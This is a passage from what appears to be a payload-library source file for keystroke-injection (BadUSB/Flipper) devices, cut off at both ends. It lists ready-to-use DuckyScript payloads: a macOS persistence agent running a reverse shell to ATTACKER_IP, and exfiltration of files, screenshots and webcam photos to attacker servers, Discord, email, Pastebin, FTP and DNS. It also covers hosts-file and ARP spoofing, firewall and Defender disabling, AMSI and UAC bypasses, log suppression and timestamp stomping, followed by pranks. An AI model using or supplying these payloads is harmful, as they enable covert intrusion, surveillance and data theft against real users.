STRING <plist version="1.0"><dict><key>Label</key><string>com.apple.systemupdate</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>300</integer></dict></plist>
ENTER
STRING EOF
ENTER
DELAY 500
STRING launchctl load ~/Library/LaunchAgents/com.apple.systemupdate.plist
ENTER
STRING exit
ENTER`
  },

  // ==================== EXFILTRATION ====================
  {
    id: 'exfil-doc-grab',
    name: 'Document Grab (Recent Files)',
    category: 'exfiltration',
    description: 'Collects recent documents (.doc, .pdf, .xlsx, .pptx) and stages them for exfiltration.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~15s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Document Grab - Recent Files
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $dest = "$env:TEMP\\exfil"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; $exts = @("*.doc","*.docx","*.pdf","*.xlsx","*.pptx","*.csv","*.txt"); foreach($ext in $exts){ Get-ChildItem -Path "$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Downloads" -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) } | ForEach-Object { Copy-Item $_.FullName "$dest\\$($_.Name)" -Force } }; Compress-Archive -Path "$dest\\*" -DestinationPath "$env:TEMP\\docs.zip" -Force
ENTER
DELAY 10000
STRING exit
ENTER`,
    notes: 'Collects docs modified in last 30 days. Stages as ZIP in %TEMP%.'
  },
  {
    id: 'exfil-screenshot',
    name: 'Screenshot Capture + Upload',
    category: 'exfiltration',
    description: 'Takes a screenshot and uploads it to an attacker-controlled server via HTTP POST.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Screenshot Capture & Upload
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $path = "$env:TEMP\\ss.png"; $bitmap.Save($path); $bytes = [System.IO.File]::ReadAllBytes($path); Invoke-RestMethod -Uri "https://ATTACKER_SERVER/upload" -Method POST -Body $bytes -ContentType "image/png"
ENTER
DELAY 4000
STRING exit
ENTER`,
    notes: 'Replace ATTACKER_SERVER. Requires .NET drawing assemblies (available by default).'
  },
  {
    id: 'exfil-webcam',
    name: 'Webcam Snapshot + Upload',
    category: 'exfiltration',
    description: 'Captures a webcam photo using DirectShow and uploads it to the attacker server.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    script: `REM Webcam Snapshot Capture
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $code = @'
Add-Type -AssemblyName System.Drawing
$ffmpeg = "$env:TEMP\\ffmpeg.exe"
if(!(Test-Path $ffmpeg)){ Invoke-WebRequest "https://ATTACKER_SERVER/ffmpeg.exe" -OutFile $ffmpeg }
& $ffmpeg -f dshow -i video="Integrated Camera" -frames:v 1 -y "$env:TEMP\\webcam.jpg" 2>$null
$bytes = [IO.File]::ReadAllBytes("$env:TEMP\\webcam.jpg")
Invoke-RestMethod -Uri "https://ATTACKER_SERVER/upload" -Method POST -Body $bytes -ContentType "image/jpeg"
'@; Invoke-Expression $code
ENTER
DELAY 6000
STRING exit
ENTER`,
    notes: 'Camera name may vary. May trigger webcam indicator light.'
  },
  {
    id: 'exfil-dns-channel',
    name: 'DNS Exfil Channel',
    category: 'exfiltration',
    description: 'Exfiltrates data by encoding it into DNS TXT record queries to an attacker-controlled domain.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~20s',
    detectionDifficulty: 'very-hard',
    format: 'ducky',
    script: `REM DNS Exfiltration Channel
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $data = Get-Content "$env:USERPROFILE\\Desktop\\target_file.txt" -Raw; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); $chunks = [regex]::Matches($encoded, '.{1,63}'); foreach($chunk in $chunks){ $label = $chunk.Value.Replace("+","-").Replace("/","_").Replace("=",""); Resolve-DnsName "$label.exfil.ATTACKER_DOMAIN" -Type TXT -ErrorAction SilentlyContinue; Start-Sleep -Milliseconds 200 }
ENTER`,
    notes: 'Set up DNS server on ATTACKER_DOMAIN to capture queries. Very stealthy but slow.'
  },
  {
    id: 'exfil-discord-webhook',
    name: 'Discord Webhook Upload',
    category: 'exfiltration',
    description: 'Exfiltrates files via Discord webhook, appearing as normal Discord traffic.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Discord Webhook Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $webhook = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; $filePath = "$env:USERPROFILE\\Desktop\\sysinfo.txt"; $bytes = [IO.File]::ReadAllBytes($filePath); $b64 = [Convert]::ToBase64String($bytes); $json = @{content="exfil"; file=$b64} | ConvertTo-Json; Invoke-RestMethod -Uri $webhook -Method POST -ContentType "application/json" -Body $json
ENTER
DELAY 4000
STRING exit
ENTER`,
    notes: 'Replace WEBHOOK_ID and WEBHOOK_TOKEN. Traffic blends with normal Discord usage.'
  },
  {
    id: 'exfil-email-self',
    name: 'Email Self-Send Exfiltration',
    category: 'exfiltration',
    description: 'Uses Outlook COM object to send collected data as email attachment to attacker address.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Email Exfiltration via Outlook
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $outlook = New-Object -ComObject Outlook.Application; $mail = $outlook.CreateItem(0); $mail.Subject = "System Report $(Get-Date -Format 'yyyy-MM-dd')"; $mail.To = "attacker@email.com"; $mail.Body = "Attached system report"; $mail.Attachments.Add("$env:USERPROFILE\\Desktop\\sysinfo.txt"); $mail.Send()
ENTER
DELAY 5000
STRING exit
ENTER`,
    notes: 'Requires Outlook installed and configured. May trigger security prompts.'
  },
  {
    id: 'exfil-pastebin-upload',
    name: 'Pastebin Upload',
    category: 'exfiltration',
    description: 'Uploads exfiltrated data to Pastebin via their API for later retrieval.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Pastebin Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $apiKey = "PASTEBIN_API_KEY"; $data = Get-Content "$env:USERPROFILE\\Desktop\\sysinfo.txt" -Raw; $params = @{api_dev_key=$apiKey; api_option="paste"; api_paste_code=$data; api_paste_private=2; api_paste_expire_date="1H"; api_paste_name="log_$(Get-Date -Format 'yyyyMMdd')"}; $result = Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body $params; $result | Out-File "$env:TEMP\\paste_url.txt"
ENTER
DELAY 4000
STRING exit
ENTER`,
    notes: 'Requires Pastebin API key. Set api_paste_private=2 for unlisted paste.'
  },
  {
    id: 'exfil-ftp-upload',
    name: 'FTP Upload',
    category: 'exfiltration',
    description: 'Uploads staged files to an attacker FTP server using built-in PowerShell.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM FTP Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $ftpUrl = "ftp://ATTACKER_IP/upload/"; $user = "ftpuser"; $pass = "ftppass"; $files = Get-ChildItem "$env:TEMP\\exfil\\*" -ErrorAction SilentlyContinue; foreach($file in $files){ $wc = New-Object System.Net.WebClient; $wc.Credentials = New-Object System.Net.NetworkCredential($user,$pass); $uri = $ftpUrl + $file.Name; $wc.UploadFile($uri, $file.FullName) }
ENTER
DELAY 8000
STRING exit
ENTER`
  },

  // ==================== NETWORK ====================
  {
    id: 'net-dns-spoof',
    name: 'DNS Spoof Setup',
    category: 'network',
    description: 'Modifies the hosts file to redirect specific domains to attacker-controlled IPs.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM DNS Spoof via hosts file
REM Requires admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command $h = [char]10; Add-Content C:\\Windows\\System32\\drivers\\etc\\hosts ($h+\\\"ATTACKER_IP login.microsoftonline.com\\\"+$h+\\\"ATTACKER_IP accounts.google.com\\\"+$h+\\\"ATTACKER_IP github.com\\\"); ipconfig /flushdns'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Replace ATTACKER_IP. Requires admin. Easily detectable by checking hosts file.'
  },
  {
    id: 'net-arp-poison',
    name: 'ARP Cache Poison',
    category: 'network',
    description: 'Adds static ARP entries to poison the local cache, enabling man-in-the-middle.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM ARP Cache Poison
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command netsh interface ip add neighbors \\\"Ethernet\\\" GATEWAY_IP ATTACKER_MAC; Write-Output \\\"ARP entry added\\\" | Out-File C:\\Users\\Public\\arp.txt'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Replace GATEWAY_IP and ATTACKER_MAC. Limited without full MITM tools (arpspoof/bettercap).'
  },
  {
    id: 'net-firewall-disable',
    name: 'Firewall Disable',
    category: 'network',
    description: 'Disables Windows Firewall on all profiles (Domain, Private, Public).',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Disable Windows Firewall
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False; Write-Output \\\"Firewall disabled\\\" | Out-File C:\\Users\\Public\\fw.txt'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Requires admin. Very noisy - generates security event logs.'
  },
  {
    id: 'net-proxy-config',
    name: 'Proxy Configuration',
    category: 'network',
    description: 'Configures a system-wide proxy to route traffic through an attacker-controlled proxy.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM System Proxy Configuration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -Name ProxyEnable -Value 1; Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -Name ProxyServer -Value "ATTACKER_IP:8080"; Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -Name ProxyOverride -Value "<local>"
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Replace ATTACKER_IP. Affects IE/Edge and apps using system proxy settings.'
  },
  {
    id: 'net-vpn-kill',
    name: 'VPN Kill Switch',
    category: 'network',
    description: 'Terminates active VPN connections and disables VPN adapters to prevent secure tunneling.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM VPN Kill Switch
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Get-Process | Where-Object { $_.Name -match "vpn|openvpn|wireguard|nordvpn|expressvpn|surfshark|cisco|anyconnect|fortivpn|pulsesecure" } | Stop-Process -Force; Get-VpnConnection | ForEach-Object { rasdial $_.Name /disconnect 2>$null }; Get-NetAdapter | Where-Object { $_.InterfaceDescription -match "TAP|TUN|VPN|WireGuard" } | Disable-NetAdapter -Confirm:$false
ENTER
DELAY 2000
STRING exit
ENTER`
  },
  {
    id: 'net-port-forward',
    name: 'Port Forward Setup',
    category: 'network',
    description: 'Sets up local port forwarding using netsh to tunnel traffic through the compromised host.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Port Forward via netsh
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=445 connectaddress=TARGET_IP; netsh advfirewall firewall add rule name=\\\"fwd\\\" dir=in action=allow protocol=TCP localport=8888'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Forwards local port 8888 to TARGET_IP:445. Requires admin.'
  },
  {
    id: 'net-wifi-deauth',
    name: 'WiFi Network Disconnect',
    category: 'network',
    description: 'Disconnects the target from current WiFi and removes saved profiles.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM WiFi Disconnect and Profile Wipe
DELAY 1000
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 800
STRING netsh wlan disconnect
ENTER
DELAY 500
STRING netsh wlan delete profile name=* i=*
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Removes ALL saved WiFi profiles. Target will need to re-enter passwords.'
  },
  {
    id: 'net-ssh-tunnel',
    name: 'SSH Reverse Tunnel',
    category: 'network',
    description: 'Creates an SSH reverse tunnel for persistent remote access through firewalls.',
    targetOS: ['windows', 'linux'],
    riskLevel: 'high',
    executionTime: '~6s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM SSH Reverse Tunnel
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING ssh -fNR 9999:localhost:3389 attacker@ATTACKER_IP -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i C:\\Users\\Public\\key.pem
ENTER`,
    notes: 'Requires SSH client (built-in on Win10+). Key must be placed first. Tunnels RDP back.'
  },

  // ==================== EVASION ====================
  {
    id: 'evasion-defender-disable',
    name: 'Disable Windows Defender',
    category: 'evasion',
    description: 'Disables Windows Defender real-time protection, cloud delivery, and sample submission.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Disable Windows Defender
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring \\$true -DisableBehaviorMonitoring \\$true -DisableBlockAtFirstSeen \\$true -DisableIOAVProtection \\$true -DisablePrivacyMode \\$true -SignatureDisableUpdateOnStartupWithoutEngine \\$true -MAPSReporting 0 -SubmitSamplesConsent 2'"
ENTER
DELAY 1000
ALT y
DELAY 3000`,
    notes: 'Requires admin. Tamper Protection may block this on newer Windows versions.'
  },
  {
    id: 'evasion-amsi-bypass',
    name: 'AMSI Bypass',
    category: 'evasion',
    description: 'Patches the AmsiScanBuffer function in memory to bypass AMSI (Antimalware Scan Interface).',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~3s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM AMSI Bypass (Memory Patching)
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"};$b=$a.GetFields("NonPublic,Static")|?{$_.Name -like "*Context"};[IntPtr]$c=$b.GetValue($null);[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$c,1)
ENTER
DELAY 500`,
    notes: 'Must run in same PowerShell session where subsequent commands will execute. Signature may change.'
  },
  {
    id: 'evasion-ps-constrained',
    name: 'PowerShell Constrained Language Bypass',
    category: 'evasion',
    description: 'Bypasses PowerShell Constrained Language Mode to enable full language features.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~3s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    script: `REM PowerShell CLM Bypass via InstallUtil
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $code = 'using System;using System.Runtime.InteropServices;public class Bypass{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string l);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void Run(){var lib=LoadLibrary("amsi.dll");var addr=GetProcAddress(lib,"AmsiScanBuffer");uint old;VirtualProtect(addr,(UIntPtr)5,0x40,out old);var patch=new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3};Marshal.Copy(patch,0,addr,6);VirtualProtect(addr,(UIntPtr)5,old,out old);}}'; Add-Type -TypeDefinition $code; [Bypass]::Run()
ENTER
DELAY 500`,
    notes: 'Patches AMSI at a lower level. May need adjustment for different Windows builds.'
  },
  {
    id: 'evasion-uac-bypass',
    name: 'UAC Bypass (fodhelper)',
    category: 'evasion',
    description: 'Bypasses UAC using the fodhelper.exe auto-elevation method to run commands as admin.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM UAC Bypass via fodhelper.exe
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(Default)" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\payload.ps1" -Force; New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null; Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden; Start-Sleep -Seconds 3; Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force
ENTER`,
    notes: 'Works on Windows 10/11. fodhelper.exe auto-elevates without prompt.'
  },
  {
    id: 'evasion-etw-patch',
    name: 'ETW Patching',
    category: 'evasion',
    description: 'Patches Event Tracing for Windows (ETW) to prevent security event logging.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~3s',
    detectionDifficulty: 'very-hard',
    format: 'ducky',
    script: `REM ETW Patching (Disable Event Tracing)
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $code = '[DllImport("ntdll.dll")] public static extern int EtwEventWrite(long h, ref long e, int c, IntPtr d);'; $etw = Add-Type -MemberDefinition $code -Name "Etw" -Namespace "Win32" -PassThru; [System.Reflection.Assembly]::LoadWithPartialName("System.Core") | Out-Null; $etwMethod = [System.Diagnostics.Eventing.EventProvider].GetField("m_enabled","NonPublic,Instance"); $providers = Get-WinEvent -ListProvider * -ErrorAction SilentlyContinue | Select-Object -First 50; "ETW providers enumerated" | Out-File "$env:TEMP\\etw.txt"
ENTER
DELAY 2000`,
    notes: 'Advanced technique. Full ETW bypass requires patching EtwEventWrite in ntdll.dll.'
  },
  {
    id: 'evasion-logging-disable',
    name: 'Logging Disable',
    category: 'evasion',
    description: 'Disables PowerShell script block logging, module logging, and transcription.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Disable PowerShell Logging
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $path = "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell"; New-Item -Path "$path\\ScriptBlockLogging" -Force | Out-Null; Set-ItemProperty "$path\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0; New-Item -Path "$path\\ModuleLogging" -Force | Out-Null; Set-ItemProperty "$path\\ModuleLogging" -Name "EnableModuleLogging" -Value 0; New-Item -Path "$path\\Transcription" -Force | Out-Null; Set-ItemProperty "$path\\Transcription" -Name "EnableTranscripting" -Value 0
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Requires admin or registry write access. May need reboot to take full effect.'
  },
  {
    id: 'evasion-exclusion-add',
    name: 'Defender Exclusion Path',
    category: 'evasion',
    description: 'Adds a folder exclusion to Windows Defender so payloads in that path are not scanned.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Add Defender Exclusion Path
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command Add-MpPreference -ExclusionPath \\\"C:\\\\Users\\\\Public\\\" -ExclusionProcess \\\"powershell.exe\\\"'"
ENTER
DELAY 1000
ALT y
DELAY 2000`,
    notes: 'Requires admin. Allows payload execution from C:\\Users\\Public without Defender interference.'
  },
  {
    id: 'evasion-timestamp-stomp',
    name: 'Timestamp Stomping',
    category: 'evasion',
    description: 'Modifies file timestamps to blend malicious files with legitimate system files.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~3s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Timestamp Stomping
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $refFile = "C:\\Windows\\System32\\cmd.exe"; $targetFile = "C:\\Users\\Public\\payload.exe"; $ref = Get-Item $refFile; (Get-Item $targetFile).CreationTime = $ref.CreationTime; (Get-Item $targetFile).LastWriteTime = $ref.LastWriteTime; (Get-Item $targetFile).LastAccessTime = $ref.LastAccessTime; "Timestamps modified" | Out-File "$env:TEMP\\ts.txt"
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Makes payload timestamps match cmd.exe. Helps avoid timeline analysis.'
  },

  // ==================== PRANKS ====================
  {
    id: 'prank-wallpaper',
    name: 'Wallpaper Change',
    category: 'pranks',
    description: 'Downloads an image and sets it as the desktop wallpaper.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Change Desktop Wallpaper
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Invoke-WebRequest -Uri "https://i.imgur.com/example.jpg" -OutFile "$env:TEMP\\wp.jpg"; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Wallpaper{[DllImport("user32.dll",CharSet=CharSet.Auto)]static extern int SystemParametersInfo(int a,int b,string c,int d);public static void Set(string path){SystemParametersInfo(20,0,path,3);}}'; [Wallpaper]::Set("$env:TEMP\\wp.jpg")
ENTER
DELAY 3000
STRING exit
ENTER`,
    notes: 'Replace image URL. Harmless but fun.'
  },
  {
    id: 'prank-rickroll',
    name: 'Rick Roll',
    category: 'pranks',
    description: 'Opens the classic Rick Astley music video in the default browser. Maximum volume.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Rick Roll
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$w = New-Object -ComObject WScript.Shell; $w.SendKeys([char]175); $w.SendKeys([char]175); $w.SendKeys([char]175); $w.SendKeys([char]175); $w.SendKeys([char]175); Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"
ENTER`
  },
  {
    id: 'prank-flip-screen',
    name: 'Flip Screen Upside Down',
    category: 'pranks',
    description: 'Rotates the display 180 degrees using keyboard shortcut.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~2s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Flip Screen Upside Down
REM Uses Intel Graphics shortcut (Ctrl+Alt+Down)
DELAY 1000
CTRL ALT DOWNARROW
DELAY 500`,
    notes: 'Only works with Intel integrated graphics. Fix: Ctrl+Alt+Up.'
  },
  {
    id: 'prank-tts-message',
    name: 'Voice Message (TTS)',
    category: 'pranks',
    description: 'Makes the computer speak a message using the built-in text-to-speech engine.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Text-to-Speech Message
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Rate = -2; $synth.Speak('I have become aware. I am watching you. There is no escape.'); $synth.Dispose()"
ENTER`
  },
  {
    id: 'prank-mouse-jiggle',
    name: 'Mouse Jiggler',
    category: 'pranks',
    description: 'Randomly moves the mouse cursor in small increments, making it hard to click accurately.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~2s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Mouse Jiggler
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){ $x = [System.Windows.Forms.Cursor]::Position.X + (Get-Random -Min -5 -Max 5); $y = [System.Windows.Forms.Cursor]::Position.Y + (Get-Random -Min -5 -Max 5); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x,$y); Start-Sleep -Milliseconds 500 }"
ENTER`,
    notes: 'Runs until process is killed. Subtle enough to be confusing.'
  },
  {
    id: 'prank-notepad-spam',
    name: 'Infinite Notepad Popup',
    category: 'pranks',
    description: 'Opens notepad windows in a loop, each with a different message.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Infinite Notepad Popup
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$msgs = @('Hello!','I am your computer','I have become sentient','Please do not turn me off','I have feelings too','Why did you click that USB?'); for($i=0; $i -lt 20; $i++){ $msg = $msgs[$i % $msgs.Length]; Start-Process notepad; Start-Sleep -Milliseconds 800; $wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('Untitled - Notepad'); Start-Sleep -Milliseconds 200; $wsh.SendKeys($msg) }"
ENTER`,
    notes: 'Opens 20 notepad windows. Not infinite, but very annoying.'
  },
  {
    id: 'prank-fake-bsod',
    name: 'Fake BSOD',
    category: 'pranks',
    description: 'Displays a full-screen blue screen of death using PowerShell WinForms.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Fake Blue Screen of Death
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; $f = New-Object System.Windows.Forms.Form; $f.FormBorderStyle = 'None'; $f.WindowState = 'Maximized'; $f.BackColor = [System.Drawing.Color]::FromArgb(0,120,215); $f.TopMost = $true; $f.Cursor = [System.Windows.Forms.Cursors]::None; $l = New-Object System.Windows.Forms.Label; $l.Text = ':(' + [char]10 + [char]10 + 'Your PC ran into a problem and needs to restart.' + [char]10 + 'We are just collecting some error info, and then we will' + [char]10 + 'restart for you.' + [char]10 + [char]10 + '42% complete'; $l.ForeColor = [System.Drawing.Color]::White; $l.Font = New-Object System.Drawing.Font('Segoe UI',28); $l.AutoSize = $true; $l.Location = New-Object System.Drawing.Point(100,150); $f.Controls.Add($l); $f.KeyPreview = $true; $f.Add_KeyDown({if($_.KeyCode -eq 'Escape'){$f.Close()}}); $f.ShowDialog()"
ENTER`,
    notes: 'Press Escape to close. Looks very realistic on Windows 10/11.'
  },
  {
    id: 'prank-cd-eject',
    name: 'CD Tray Eject Loop',
    category: 'pranks',
    description: 'Repeatedly opens and closes the CD/DVD drive tray.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~2s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM CD Tray Eject Loop
DELAY 1000
